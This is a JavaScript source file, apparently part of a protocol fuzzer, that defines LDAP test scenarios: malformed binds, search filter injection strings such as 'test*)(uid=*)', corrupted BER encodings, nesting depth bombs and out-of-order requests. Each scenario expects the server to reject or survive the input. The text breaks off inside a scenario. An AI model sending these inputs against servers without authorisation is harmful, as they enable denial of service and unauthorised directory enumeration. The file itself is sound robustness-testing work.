// LDAP Fuzzer Scenarios — 12 categories (LA–LL), ~140 scenarios
// Each scenario has: name, category, description, side, actions(opts), expected, expectedReason
// Actions return arrays of { type: 'send'|'recv'|'delay'|'connect'|'close', data: Buffer, ... }
// Pattern follows lib/scenarios.js (TLS), lib/quic-scenarios.js, lib/tcp-scenarios.js

const pkt = require('./packet');
const {
  BER, LDAP_OP, LDAP_OP_NAME, LDAP_RESULT, LDAP_RESULT_NAME,
  SEARCH_SCOPE, DEREF_ALIASES, FILTER, SUBSTRING, EXTENSIBLE,
  MODIFY_OP, LDAP_OID, LDAP_CONTROL, AD_CAPABILITY, SASL_MECHANISM, AUTH_TAG,
} = require('./constants');


// ═══════════════════════════════════════════════════════════════════════════════
//  CATEGORIES
// ═══════════════════════════════════════════════════════════════════════════════

const LDAP_CATEGORIES = {
  LA: 'Authentication Attacks',
  LB: 'Search Filter Injection',
  LC: 'BER/ASN.1 Encoding Violations',
  LD: 'Protocol Sequence Violations',
  LE: 'Resource Exhaustion',
  LF: 'LDAPS/StartTLS Transport',
  LG: 'AD-Specific Attacks',
  LH: 'Operation Fuzzing (Modify/Add/Del)',
  LI: 'Extended Operations',
  LJ: 'Server-to-Client Attacks',
  LK: 'CVE Reproductions',
  LL: 'Connectivity & Baseline',
};

const LDAP_CATEGORY_SEVERITY = {
  LA: 'critical',
  LB: 'high',
  LC: 'high',
  LD: 'medium',
  LE: 'high',
  LF: 'critical',
  LG: 'critical',
  LH: 'medium',
  LI: 'medium',
  LJ: 'high',
  LK: 'critical',
  LL: 'info',
};

const LDAP_CATEGORY_DEFAULT_DISABLED = new Set(['LJ', 'LK']);


// ═══════════════════════════════════════════════════════════════════════════════
//  HELPER FUNCTIONS
// ═══════════════════════════════════════════════════════════════════════════════

/** Monotonically increasing message IDs per scenario run */
let _msgCounter = 0;
function nextMsgId() { return ++_msgCounter; }
function resetMsgId() { _msgCounter = 0; }

/** Build a simple bind action sequence */
function bindActions(dn = '', password = '', version = 3) {
  const msgId = nextMsgId();
  return [
    { type: 'send', data: pkt.buildBindRequest(msgId, { dn, password, version }), label: `BindRequest(dn="${dn}")` },
    { type: 'recv', timeout: 5000, label: 'BindResponse' },
  ];
}

/** Build an anonymous bind */
function anonBindActions() {
  return bindActions('', '');
}

/** Search request action */
function searchAction(baseDN, scope, filter, attrs = [], opts = {}) {
  const msgId = nextMsgId();
  return {
    type: 'send',
    data: pkt.buildSearchRequest(msgId, {
      baseDN,
      scope,
      filter,
      attributes: attrs,
      sizeLimit: opts.sizeLimit || 0,
      timeLimit: opts.timeLimit || 0,
      typesOnly: opts.typesOnly || false,
      derefAliases: opts.derefAliases || 0,
    }),
    label: opts.label || `SearchRequest(base="${baseDN}")`,
  };
}


// ═══════════════════════════════════════════════════════════════════════════════
//  SCENARIOS
// ═══════════════════════════════════════════════════════════════════════════════

const LDAP_SCENARIOS = [

  // ─────────────────────────────────────────────────────────────────────────────
  //  LA — Authentication Attacks (critical)
  // ─────────────────────────────────────────────────────────────────────────────

  {
    name: 'ldap-anon-bind',
    category: 'LA',
    description: 'Anonymous bind — empty DN and password, should be rejected or restricted',
    side: 'client',
    actions: () => {
      resetMsgId();
      return [
        ...anonBindActions(),
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should accept or reject anonymous bind with valid response',
  },

  {
    name: 'ldap-simple-bind-valid',
    category: 'LA',
    description: 'Simple bind with valid admin credentials',
    side: 'client',
    actions: (opts) => {
      resetMsgId();
      const dn = opts.bindDN || 'cn=admin,dc=example,dc=com';
      const pw = opts.bindPassword || 'password';
      return [
        ...bindActions(dn, pw),
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should respond with BindResponse (success or invalidCredentials)',
  },

  {
    name: 'ldap-simple-bind-empty-password',
    category: 'LA',
    description: 'Simple bind with non-empty DN but empty password — unauthenticated bind',
    side: 'client',
    actions: () => {
      resetMsgId();
      return [
        ...bindActions('cn=admin,dc=example,dc=com', ''),
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should reject unauthenticated simple bind per RFC 4513 Section 5.1.2',
  },

  {
    name: 'ldap-null-bind',
    category: 'LA',
    description: 'Null bind — DN and password set to null bytes',
    side: 'client',
    actions: () => {
      resetMsgId();
      const msgId = nextMsgId();
      return [
        { type: 'send', data: pkt.buildBindRequest(msgId, { dn: '\x00', password: '\x00' }), label: 'NullBind' },
        { type: 'recv', timeout: 5000, label: 'BindResponse' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should handle null bytes gracefully',
  },

  {
    name: 'ldap-bind-version-2',
    category: 'LA',
    description: 'Bind with LDAPv2 — should be rejected by modern servers',
    side: 'client',
    actions: () => {
      resetMsgId();
      return [
        ...bindActions('cn=admin,dc=example,dc=com', 'password', 2),
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should reject v2 or downgrade gracefully',
  },

  {
    name: 'ldap-bind-version-0',
    category: 'LA',
    description: 'Bind with invalid version 0',
    side: 'client',
    actions: () => {
      resetMsgId();
      const msgId = nextMsgId();
      return [
        { type: 'send', data: pkt.buildBindRequest(msgId, { version: 0, dn: '', password: '' }), label: 'BindV0' },
        { type: 'recv', timeout: 5000, label: 'BindResponse' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should reject invalid protocol version',
  },

  {
    name: 'ldap-bind-version-255',
    category: 'LA',
    description: 'Bind with absurd version 255',
    side: 'client',
    actions: () => {
      resetMsgId();
      const msgId = nextMsgId();
      return [
        { type: 'send', data: pkt.buildBindRequest(msgId, { version: 255, dn: '', password: '' }), label: 'BindV255' },
        { type: 'recv', timeout: 5000, label: 'BindResponse' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should reject unknown protocol version',
  },

  {
    name: 'ldap-sasl-plain-bind',
    category: 'LA',
    description: 'SASL PLAIN bind — authzid\\0authcid\\0password',
    side: 'client',
    actions: () => {
      resetMsgId();
      const msgId = nextMsgId();
      const creds = Buffer.from('\x00admin\x00password');
      return [
        { type: 'send', data: pkt.buildBindRequest(msgId, { mechanism: 'PLAIN', credentials: creds }), label: 'SASLPlainBind' },
        { type: 'recv', timeout: 5000, label: 'BindResponse' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should process SASL PLAIN or reject if unsupported',
  },

  {
    name: 'ldap-sasl-external-bind',
    category: 'LA',
    description: 'SASL EXTERNAL bind — rely on TLS client cert',
    side: 'client',
    actions: () => {
      resetMsgId();
      const msgId = nextMsgId();
      return [
        { type: 'send', data: pkt.buildBindRequest(msgId, { mechanism: 'EXTERNAL', credentials: Buffer.alloc(0) }), label: 'SASLExternalBind' },
        { type: 'recv', timeout: 5000, label: 'BindResponse' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should reject EXTERNAL without TLS client cert',
  },

  {
    name: 'ldap-sasl-unknown-mechanism',
    category: 'LA',
    description: 'SASL bind with unknown mechanism FOOBAR',
    side: 'client',
    actions: () => {
      resetMsgId();
      const msgId = nextMsgId();
      return [
        { type: 'send', data: pkt.buildBindRequest(msgId, { mechanism: 'FOOBAR', credentials: Buffer.from('garbage') }), label: 'SASLUnknown' },
        { type: 'recv', timeout: 5000, label: 'BindResponse' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should return authMethodNotSupported',
  },

  {
    name: 'ldap-sasl-gssapi-garbage',
    category: 'LA',
    description: 'SASL GSSAPI bind with garbage Kerberos token',
    side: 'client',
    actions: () => {
      resetMsgId();
      const msgId = nextMsgId();
      const garbage = Buffer.from('60820100300000000000', 'hex'); // fake ASN.1 GSSAPI token header
      return [
        { type: 'send', data: pkt.buildBindRequest(msgId, { mechanism: 'GSSAPI', credentials: garbage }), label: 'GSSAPIGarbage' },
        { type: 'recv', timeout: 5000, label: 'BindResponse' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should reject malformed Kerberos token',
  },

  {
    name: 'ldap-sasl-ntlm-garbage',
    category: 'LA',
    description: 'SASL GSS-SPNEGO bind with garbage NTLM negotiate',
    side: 'client',
    actions: () => {
      resetMsgId();
      const msgId = nextMsgId();
      // Fake NTLMSSP negotiate message (signature + type 1)
      const ntlm = Buffer.concat([
        Buffer.from('4E544C4D53535000', 'hex'),  // "NTLMSSP\0"
        Buffer.from('01000000', 'hex'),           // Type 1 (Negotiate)
        Buffer.alloc(24),                          // Garbage flags/domains
      ]);
      return [
        { type: 'send', data: pkt.buildBindRequest(msgId, { mechanism: 'GSS-SPNEGO', credentials: ntlm }), label: 'NTLMGarbage' },
        { type: 'recv', timeout: 5000, label: 'BindResponse' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should reject malformed NTLM negotiate',
  },

  {
    name: 'ldap-bind-long-dn',
    category: 'LA',
    description: 'Bind with 10KB DN — buffer overflow test',
    side: 'client',
    actions: () => {
      resetMsgId();
      const msgId = nextMsgId();
      const longDN = 'cn=' + 'A'.repeat(10000) + ',dc=example,dc=com';
      return [
        { type: 'send', data: pkt.buildBindRequest(msgId, { dn: longDN, password: 'test' }), label: 'LongDNBind' },
        { type: 'recv', timeout: 5000, label: 'BindResponse' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should reject oversized DN without crashing',
  },

  {
    name: 'ldap-bind-long-password',
    category: 'LA',
    description: 'Bind with 100KB password — memory pressure test',
    side: 'client',
    actions: () => {
      resetMsgId();
      const msgId = nextMsgId();
      return [
        { type: 'send', data: pkt.buildBindRequest(msgId, { dn: 'cn=admin,dc=test,dc=com', password: 'P'.repeat(100000) }), label: 'LongPasswordBind' },
        { type: 'recv', timeout: 5000, label: 'BindResponse' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should handle oversized password without crash',
  },

  {
    name: 'ldap-rapid-rebind',
    category: 'LA',
    description: 'Rapid sequential rebinds — 20 bind requests on same connection',
    side: 'client',
    actions: () => {
      resetMsgId();
      const actions = [];
      for (let i = 0; i < 20; i++) {
        const msgId = nextMsgId();
        actions.push({ type: 'send', data: pkt.buildBindRequest(msgId, { dn: `cn=user${i},dc=test,dc=com`, password: `pass${i}` }), label: `ReBind-${i}` });
        actions.push({ type: 'recv', timeout: 3000, label: `BindResponse-${i}` });
      }
      return actions;
    },
    expected: 'PASSED',
    expectedReason: 'Server should handle rapid rebinds without leaking state',
  },


  // ─────────────────────────────────────────────────────────────────────────────
  //  LB — Search Filter Injection (high)
  // ─────────────────────────────────────────────────────────────────────────────

  {
    name: 'ldap-search-wildcard-all',
    category: 'LB',
    description: 'Search with (objectClass=*) — enumerate all entries',
    side: 'client',
    actions: () => {
      resetMsgId();
      return [
        ...anonBindActions(),
        searchAction('dc=example,dc=com', SEARCH_SCOPE.wholeSubtree,
          { type: 'present', attr: 'objectClass' }, ['dn']),
        { type: 'recv', timeout: 10000, label: 'SearchResults' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should return entries or access denied',
  },

  {
    name: 'ldap-search-filter-injection-or',
    category: 'LB',
    description: 'OR filter injection — (|(uid=admin)(uid=*))',
    side: 'client',
    actions: () => {
      resetMsgId();
      return [
        ...anonBindActions(),
        searchAction('dc=example,dc=com', SEARCH_SCOPE.wholeSubtree,
          { type: 'or', filters: [
            { type: 'eq', attr: 'uid', value: 'admin' },
            { type: 'eq', attr: 'uid', value: '*' },
          ]}, ['uid', 'cn']),
        { type: 'recv', timeout: 5000, label: 'SearchResults' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should process compound filter or reject',
  },

  {
    name: 'ldap-search-filter-nested-and-or',
    category: 'LB',
    description: 'Deeply nested AND/OR filters — 10 levels deep',
    side: 'client',
    actions: () => {
      resetMsgId();
      let filter = { type: 'eq', attr: 'cn', value: 'test' };
      for (let i = 0; i < 10; i++) {
        filter = i % 2 === 0
          ? { type: 'and', filters: [filter, { type: 'present', attr: 'objectClass' }] }
          : { type: 'or', filters: [filter, { type: 'eq', attr: 'uid', value: 'x' }] };
      }
      return [
        ...anonBindActions(),
        searchAction('dc=example,dc=com', SEARCH_SCOPE.wholeSubtree, filter, ['cn']),
        { type: 'recv', timeout: 5000, label: 'SearchResults' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should handle nested filters without stack overflow',
  },

  {
    name: 'ldap-search-filter-not-present',
    category: 'LB',
    description: 'NOT filter — (!(objectClass=*))',
    side: 'client',
    actions: () => {
      resetMsgId();
      return [
        ...anonBindActions(),
        searchAction('dc=example,dc=com', SEARCH_SCOPE.wholeSubtree,
          { type: 'not', filter: { type: 'present', attr: 'objectClass' } }, ['dn']),
        { type: 'recv', timeout: 5000, label: 'SearchResults' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'NOT(objectClass=*) should return zero results',
  },

  {
    name: 'ldap-search-substring-initial',
    category: 'LB',
    description: 'Substring filter — (cn=adm*)',
    side: 'client',
    actions: () => {
      resetMsgId();
      return [
        ...anonBindActions(),
        searchAction('dc=example,dc=com', SEARCH_SCOPE.wholeSubtree,
          { type: 'sub', attr: 'cn', initial: 'adm' }, ['cn']),
        { type: 'recv', timeout: 5000, label: 'SearchResults' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should process substring filter',
  },

  {
    name: 'ldap-search-substring-any-final',
    category: 'LB',
    description: 'Substring filter — (cn=*dmi*strat*r)',
    side: 'client',
    actions: () => {
      resetMsgId();
      return [
        ...anonBindActions(),
        searchAction('dc=example,dc=com', SEARCH_SCOPE.wholeSubtree,
          { type: 'sub', attr: 'cn', any: ['dmi', 'strat'], final: 'r' }, ['cn']),
        { type: 'recv', timeout: 5000, label: 'SearchResults' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should match complex substring pattern',
  },

  {
    name: 'ldap-search-extensible-match',
    category: 'LB',
    description: 'ExtensibleMatch filter — (cn:caseIgnoreMatch:=admin)',
    side: 'client',
    actions: () => {
      resetMsgId();
      return [
        ...anonBindActions(),
        searchAction('dc=example,dc=com', SEARCH_SCOPE.wholeSubtree,
          { type: 'ext', rule: '2.5.13.2', attr: 'cn', value: 'admin', dnAttributes: false },
          ['cn', 'dn']),
        { type: 'recv', timeout: 5000, label: 'SearchResults' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should process extensibleMatch or return error',
  },

  {
    name: 'ldap-search-filter-null-byte',
    category: 'LB',
    description: 'Filter with null bytes — (cn=adm\\x00in)',
    side: 'client',
    actions: () => {
      resetMsgId();
      return [
        ...anonBindActions(),
        searchAction('dc=example,dc=com', SEARCH_SCOPE.wholeSubtree,
          { type: 'eq', attr: 'cn', value: 'adm\x00in' }, ['cn']),
        { type: 'recv', timeout: 5000, label: 'SearchResults' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should handle null bytes in filter values',
  },

  {
    name: 'ldap-search-filter-special-chars',
    category: 'LB',
    description: 'Filter with special characters — (cn=test*)(uid=*))',
    side: 'client',
    actions: () => {
      resetMsgId();
      return [
        ...anonBindActions(),
        searchAction('dc=example,dc=com', SEARCH_SCOPE.wholeSubtree,
          { type: 'eq', attr: 'cn', value: 'test*)(uid=*)' }, ['cn']),
        { type: 'recv', timeout: 5000, label: 'SearchResults' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should not interpret injected filter syntax',
  },

  {
    name: 'ldap-search-filter-gte-lte',
    category: 'LB',
    description: 'Greater/Less filters — (uidNumber>=1000)(uidNumber<=9999)',
    side: 'client',
    actions: () => {
      resetMsgId();
      return [
        ...anonBindActions(),
        searchAction('dc=example,dc=com', SEARCH_SCOPE.wholeSubtree,
          { type: 'and', filters: [
            { type: 'gte', attr: 'uidNumber', value: '1000' },
            { type: 'lte', attr: 'uidNumber', value: '9999' },
          ]}, ['uid', 'uidNumber']),
        { type: 'recv', timeout: 5000, label: 'SearchResults' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should handle comparison filters',
  },

  {
    name: 'ldap-search-approx-match',
    category: 'LB',
    description: 'Approximate match filter — (cn~=admn)',
    side: 'client',
    actions: () => {
      resetMsgId();
      return [
        ...anonBindActions(),
        searchAction('dc=example,dc=com', SEARCH_SCOPE.wholeSubtree,
          { type: 'approx', attr: 'cn', value: 'admn' }, ['cn']),
        { type: 'recv', timeout: 5000, label: 'SearchResults' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should process approx match or return error',
  },

  {
    name: 'ldap-search-raw-malformed-filter',
    category: 'LB',
    description: 'Raw bytes as filter — bypass filter parser',
    side: 'client',
    actions: () => {
      resetMsgId();
      // Craft a malformed filter: use wrong context tag
      const rawFilter = Buffer.from([0xAF, 0x05, 0x04, 0x03, 0x66, 0x6F, 0x6F]); // invalid context [15]
      return [
        ...anonBindActions(),
        searchAction('dc=example,dc=com', SEARCH_SCOPE.wholeSubtree,
          { type: 'raw', data: rawFilter }, ['cn'],
          { label: 'MalformedFilter' }),
        { type: 'recv', timeout: 5000, label: 'Response' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should reject invalid filter tag',
  },


  // ─────────────────────────────────────────────────────────────────────────────
  //  LC — BER/ASN.1 Encoding Violations (high)
  // ─────────────────────────────────────────────────────────────────────────────

  {
    name: 'ldap-ber-truncated-length',
    category: 'LC',
    description: 'LDAP message with truncated BER length field',
    side: 'client',
    actions: () => {
      resetMsgId();
      const msg = pkt.buildBindRequest(1, { dn: 'cn=test', password: 'test' });
      const truncated = pkt.berMalformedLength(msg.length, 'truncated');
      const payload = Buffer.concat([Buffer.from([0x30]), truncated, msg.slice(2)]);
      return [
        { type: 'send', data: payload, label: 'TruncatedLength' },
        { type: 'recv', timeout: 5000, label: 'Response' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should reject truncated BER without crashing',
  },

  {
    name: 'ldap-ber-zero-length',
    category: 'LC',
    description: 'LDAP message with zero length',
    side: 'client',
    actions: () => {
      resetMsgId();
      return [
        { type: 'send', data: Buffer.from([0x30, 0x00]), label: 'ZeroLengthMsg' },
        { type: 'recv', timeout: 5000, label: 'Response' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should reject empty SEQUENCE',
  },

  {
    name: 'ldap-ber-overflow-length',
    category: 'LC',
    description: 'LDAP message claiming 4GB length',
    side: 'client',
    actions: () => {
      resetMsgId();
      const overflowLen = pkt.berMalformedLength(100, 'overflow');
      const body = pkt.buildBindRequest(1, { dn: '', password: '' });
      const payload = Buffer.concat([Buffer.from([0x30]), overflowLen, body.slice(2)]);
      return [
        { type: 'send', data: payload, label: 'OverflowLength' },
        { type: 'recv', timeout: 5000, label: 'Response' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should reject absurd length without allocating',
  },

  {
    name: 'ldap-ber-indefinite-length',
    category: 'LC',
    description: 'BER indefinite length encoding (0x80) — forbidden in DER',
    side: 'client',
    actions: () => {
      resetMsgId();
      const indLen = pkt.berMalformedLength(100, 'indefinite');
      const body = pkt.buildBindRequest(1, { dn: '', password: '' });
      const payload = Buffer.concat([Buffer.from([0x30]), indLen, body.slice(2), Buffer.from([0x00, 0x00])]);
      return [
        { type: 'send', data: payload, label: 'IndefiniteLength' },
        { type: 'recv', timeout: 5000, label: 'Response' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should reject or handle indefinite length',
  },

  {
    name: 'ldap-ber-negative-length',
    category: 'LC',
    description: 'BER with high-bit length byte causing signed interpretation',
    side: 'client',
    actions: () => {
      resetMsgId();
      const negLen = pkt.berMalformedLength(100, 'negative');
      const body = pkt.buildBindRequest(1, { dn: '', password: '' });
      const payload = Buffer.concat([Buffer.from([0x30]), negLen, body.slice(2)]);
      return [
        { type: 'send', data: payload, label: 'NegativeLength' },
        { type: 'recv', timeout: 5000, label: 'Response' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should not interpret length as negative',
  },

  {
    name: 'ldap-ber-wrong-tag',
    category: 'LC',
    description: 'Bind request with wrong APPLICATION tag',
    side: 'client',
    actions: () => {
      resetMsgId();
      const msg = pkt.buildBindRequest(1, { dn: '', password: '' });
      const wrongTag = pkt.buildWrongTagMessage(msg, 0x63); // SearchRequest tag on Bind body
      return [
        { type: 'send', data: wrongTag, label: 'WrongTag' },
        { type: 'recv', timeout: 5000, label: 'Response' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should reject mismatched tag/content',
  },

  {
    name: 'ldap-ber-depth-bomb-50',
    category: 'LC',
    description: 'Nested SEQUENCE 50 levels deep — stack overflow attack',
    side: 'client',
    actions: () => {
      resetMsgId();
      return [
        { type: 'send', data: pkt.buildNestedDepthBomb(50), label: 'DepthBomb-50' },
        { type: 'recv', timeout: 5000, label: 'Response' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should limit nesting depth',
  },

  {
    name: 'ldap-ber-depth-bomb-500',
    category: 'LC',
    description: 'Nested SEQUENCE 500 levels deep — extreme depth bomb',
    side: 'client',
    actions: () => {
      resetMsgId();
      return [
        { type: 'send', data: pkt.buildNestedDepthBomb(500), label: 'DepthBomb-500' },
        { type: 'recv', timeout: 5000, label: 'Response' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server must not crash on extreme nesting',
  },

  {
    name: 'ldap-ber-oversize-string-1mb',
    category: 'LC',
    description: 'OCTET STRING of 1MB inside bind request',
    side: 'client',
    actions: () => {
      resetMsgId();
      return [
        { type: 'send', data: pkt.buildOversizeString(1024 * 1024), label: 'OversizeString-1MB' },
        { type: 'recv', timeout: 10000, label: 'Response' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should reject or limit large payloads',
  },

  {
    name: 'ldap-ber-partial-message',
    category: 'LC',
    description: 'Send first half of a bind request, wait, then nothing',
    side: 'client',
    actions: () => {
      resetMsgId();
      const msg = pkt.buildBindRequest(1, { dn: 'cn=test', password: 'test' });
      const parts = pkt.buildPartialMessage(msg);
      return [
        { type: 'send', data: parts[0], label: 'PartialMsg-Half1' },
        { type: 'delay', ms: 3000 },
        // Don't send the rest — server should timeout
        { type: 'recv', timeout: 10000, label: 'TimeoutResponse' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should timeout on incomplete message',
  },

  {
    name: 'ldap-ber-split-message',
    category: 'LC',
    description: 'Split bind request into two TCP segments',
    side: 'client',
    actions: () => {
      resetMsgId();
      const msg = pkt.buildBindRequest(1, { dn: 'cn=test', password: 'test' });
      const parts = pkt.buildSplitMessage(msg);
      return [
        { type: 'send', data: parts[0], label: 'SplitMsg-Part1' },
        { type: 'delay', ms: 100 },
        { type: 'send', data: parts[1], label: 'SplitMsg-Part2' },
        { type: 'recv', timeout: 5000, label: 'BindResponse' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should reassemble split messages',
  },

  {
    name: 'ldap-ber-garbage-bytes',
    category: 'LC',
    description: 'Random garbage bytes — no valid BER structure',
    side: 'client',
    actions: () => {
      resetMsgId();
      return [
        { type: 'send', data: pkt.buildGarbageMessage(256), label: 'GarbageBytes' },
        { type: 'recv', timeout: 5000, label: 'Response' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should disconnect or send error',
  },

  {
    name: 'ldap-ber-corrupted-mid-message',
    category: 'LC',
    description: 'Valid bind request with single byte corrupted at offset 10',
    side: 'client',
    actions: () => {
      resetMsgId();
      const msg = pkt.buildBindRequest(1, { dn: 'cn=test,dc=example,dc=com', password: 'password' });
      const corrupted = pkt.buildCorruptedMessage(msg, 10, 0xFF);
      return [
        { type: 'send', data: corrupted, label: 'CorruptedByte' },
        { type: 'recv', timeout: 5000, label: 'Response' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should detect corruption and reject',
  },

  {
    name: 'ldap-ber-multiple-messages-concat',
    category: 'LC',
    description: 'Two complete LDAP messages concatenated in single TCP write',
    side: 'client',
    actions: () => {
      resetMsgId();
      const bind = pkt.buildBindRequest(1, { dn: '', password: '' });
      const search = pkt.buildSearchRequest(2, {
        baseDN: '', scope: 0,
        filter: { type: 'present', attr: 'objectClass' }, attributes: [],
      });
      return [
        { type: 'send', data: Buffer.concat([bind, search]), label: 'ConcatMessages' },
        { type: 'recv', timeout: 5000, label: 'Response1' },
        { type: 'recv', timeout: 5000, label: 'Response2' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should parse both messages from single TCP segment',
  },

  {
    name: 'ldap-ber-tag-byte-ff',
    category: 'LC',
    description: 'Message starting with tag byte 0xFF (invalid universal tag)',
    side: 'client',
    actions: () => {
      resetMsgId();
      return [
        { type: 'send', data: Buffer.from([0xFF, 0x05, 0x02, 0x01, 0x01, 0x42, 0x00]), label: 'Tag0xFF' },
        { type: 'recv', timeout: 5000, label: 'Response' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should reject invalid tag byte',
  },

  {
    name: 'ldap-ber-string-as-integer',
    category: 'LC',
    description: 'messageID encoded as OCTET STRING instead of INTEGER',
    side: 'client',
    actions: () => {
      resetMsgId();
      // Build envelope manually: SEQUENCE { OCTET_STRING("1"), BindRequest(...) }
      const badMsgId = pkt.berOctetString(Buffer.from('1'));
      const bindBody = pkt.berApplication(0, Buffer.concat([
        pkt.berInteger(3),
        pkt.berOctetString(Buffer.from('')),
        pkt.berContextTag(0, pkt.berOctetString(Buffer.from('')).slice(2), false),
      ]));
      const envelope = pkt.berSequence(Buffer.concat([badMsgId, bindBody]));
      return [
        { type: 'send', data: envelope, label: 'StringAsMsgId' },
        { type: 'recv', timeout: 5000, label: 'Response' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should reject wrong type for messageID',
  },

  {
    name: 'ldap-ber-extra-trailing-bytes',
    category: 'LC',
    description: 'Valid bind request followed by trailing garbage bytes',
    side: 'client',
    actions: () => {
      resetMsgId();
      const msg = pkt.buildBindRequest(1, { dn: '', password: '' });
      const withTrailing = Buffer.concat([msg, Buffer.from([0xDE, 0xAD, 0xBE, 0xEF])]);
      return [
        { type: 'send', data: withTrailing, label: 'TrailingBytes' },
        { type: 'recv', timeout: 5000, label: 'Response' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should ignore or reject trailing bytes after valid message',
  },


  // ─────────────────────────────────────────────────────────────────────────────
  //  LD — Protocol Sequence Violations (medium)
  // ─────────────────────────────────────────────────────────────────────────────

  {
    name: 'ldap-search-before-bind',
    category: 'LD',
    description: 'Send search request without binding first',
    side: 'client',
    actions: () => {
      resetMsgId();
      const msgId = nextMsgId();
      return [
        searchAction('dc=example,dc=com', SEARCH_SCOPE.wholeSubtree,
          { type: 'present', attr: 'objectClass' }, ['dn'],
          { label: 'SearchBeforeBind' }),
        { type: 'recv', timeout: 5000, label: 'Response' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should reject or treat as anonymous',
  },

  {
    name: 'ldap-modify-before-bind',
    category: 'LD',
    description: 'Send modify request without binding first',
    side: 'client',
    actions: () => {
      resetMsgId();
      const msgId = nextMsgId();
      return [
        { type: 'send', data: pkt.buildModifyRequest(msgId, 'cn=test,dc=example,dc=com', [
          { operation: 'replace', attribute: 'description', values: ['hacked'] },
        ]), label: 'ModifyBeforeBind' },
        { type: 'recv', timeout: 5000, label: 'Response' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should reject modify without auth',
  },

  {
    name: 'ldap-request-after-unbind',
    category: 'LD',
    description: 'Send search request after UnbindRequest',
    side: 'client',
    actions: () => {
      resetMsgId();
      return [
        ...anonBindActions(),
        { type: 'send', data: pkt.buildUnbindRequest(nextMsgId()), label: 'Unbind' },
        { type: 'delay', ms: 500 },
        searchAction('dc=example,dc=com', SEARCH_SCOPE.baseObject,
          { type: 'present', attr: 'objectClass' }, ['dn'],
          { label: 'SearchAfterUnbind' }),
        { type: 'recv', timeout: 5000, label: 'Response' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should close connection after unbind',
  },

  {
    name: 'ldap-duplicate-message-ids',
    category: 'LD',
    description: 'Two concurrent requests with same messageID',
    side: 'client',
    actions: () => {
      resetMsgId();
      return [
        ...anonBindActions(),
        { type: 'send', data: pkt.buildSearchRequest(99, {
          baseDN: 'dc=example,dc=com', scope: 0,
          filter: { type: 'present', attr: 'objectClass' }, attributes: ['cn'],
        }), label: 'Search-MsgId99-A' },
        { type: 'send', data: pkt.buildSearchRequest(99, {
          baseDN: 'dc=test,dc=com', scope: 0,
          filter: { type: 'present', attr: 'objectClass' }, attributes: ['uid'],
        }), label: 'Search-MsgId99-B' },
        { type: 'recv', timeout: 5000, label: 'Response1' },
        { type: 'recv', timeout: 5000, label: 'Response2' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should handle or reject duplicate message IDs',
  },

  {
    name: 'ldap-message-id-zero',
    category: 'LD',
    description: 'Request with messageID = 0 (reserved for unsolicited notifications)',
    side: 'client',
    actions: () => {
      resetMsgId();
      return [
        { type: 'send', data: pkt.buildBindRequest(0, { dn: '', password: '' }), label: 'MsgId0-Bind' },
        { type: 'recv', timeout: 5000, label: 'Response' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should reject messageID 0 per RFC 4511',
  },

  {
    name: 'ldap-message-id-max',
    category: 'LD',
    description: 'Request with messageID = 2147483647 (max 32-bit signed)',
    side: 'client',
    actions: () => {
      resetMsgId();
      return [
        { type: 'send', data: pkt.buildBindRequest(2147483647, { dn: '', password: '' }), label: 'MsgIdMax-Bind' },
        { type: 'recv', timeout: 5000, label: 'Response' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should handle max messageID correctly',
  },

  {
    name: 'ldap-abandon-nonexistent',
    category: 'LD',
    description: 'Abandon a messageID that was never sent',
    side: 'client',
    actions: () => {
      resetMsgId();
      return [
        ...anonBindActions(),
        { type: 'send', data: pkt.buildAbandonRequest(nextMsgId(), 99999), label: 'AbandonGhost' },
        { type: 'delay', ms: 1000 },
